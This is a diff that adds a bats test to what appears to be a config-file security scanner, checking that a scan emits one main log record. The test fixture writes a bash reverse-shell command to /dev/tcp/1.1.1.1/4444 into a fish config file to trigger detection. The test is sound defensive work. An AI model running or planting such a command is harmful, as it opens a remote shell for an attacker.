@@ -285,3 +285,11 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
+    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
+    printf 'bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-fish-config -- ')
+    [ "${main_count}" = "1" ]
+}
